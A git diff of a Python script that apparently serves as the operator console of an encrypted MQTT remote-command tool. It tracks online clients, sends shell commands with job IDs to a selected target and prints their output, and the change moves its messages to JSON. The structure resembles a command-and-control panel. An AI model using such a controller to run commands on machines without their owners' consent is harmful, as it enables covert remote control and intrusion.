@@ -4,6 +4,7 @@ import sys
 import hashlib
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+import json
 import time
 
 systype = ("windows" if os.name == "nt" else "unix")
@@ -19,7 +20,6 @@ job_list = []
 todo_list = []
 target = ""
 
-port = 28978
 func_dict = {}
 run_list = []
 
@@ -63,26 +63,30 @@ def on_disconnect(client, userdata, rc):
     connected = False
 
 def on_message(client, userdata, msg):
-    global online_list
-    
-    msg.payload = decrypt(msg.payload)
-    if msg.payload:
-        if msg.topic == topic_list["stats"]:
-            online_list[msg.payload.decode()] = 32
-        elif msg.topic == topic_list["result"]:
-            job_id = msg.payload.split(b" ")[0].decode()
-            content = b" ".join(msg.payload.split(b" ")[1:]).decode()
-            if job_id in job_list:
-                if content.split("<stderr>")[0] == "":
-                    print("\033[1;31m", end="")
-                    content = "".join(content.split("<stderr>")[1:])
-                print(content)
-                job_list.remove(job_id)
-        else:
-            print(msg.topic+" "+str(msg.payload))
+    try:
+        global online_list
+        
+        msg.payload = decrypt(msg.payload)
+        if msg.payload:
+            msg_json = json.loads(msg.payload)
+            if msg.topic == topic_list["stats"]:
+                online_list[msg_json["client_id"]] = 32
+            elif msg.topic == topic_list["result"]:
+                job_id = msg_json["job_id"]
+                result = msg_json["result"]
+                if job_id in job_list:
+                    if result.split("<stderr>")[0] == "":
+                        print("\033[1;31m", end="")
+                        result = "".join(result.split("<stderr>")[1:])
+                    print(result)
+                    job_list.remove(job_id)
+            else:
+                print(msg.topic+" "+str(msg.payload))
+    except Exception as err:
+        pass
 
-def send(client:mqtt_client.Client, topic, id, content:bytes, qos=0):
-    client.publish(topic, encrypt(id.encode() + b" " + content), qos=qos)
+def send(client:mqtt_client.Client, topic, content:dict, qos=0):
+    client.publish(topic, encrypt(json.dumps(content).encode()), qos=qos)
 
 client = mqtt_client.Client()
 client.on_connect = on_connect
@@ -132,7 +136,7 @@ while True:
             job_id = gen_id()
             while job_id in job_list:
                 job_id = gen_id()
-            send(client, topic_list["MQTT"], f"{session_id} {target}", b"cmd "+job_id.encode()+b" "+cmd.encode(), qos=2)
+            send(client, topic_list["MQTT"], {"session_id":session_id, "target":target, "mode":"cmd", "job_id":job_id, "cmd":cmd}, qos=2)
             job_list.append(job_id)
 
             if cmd.lower() in ["exit", "quit"]:
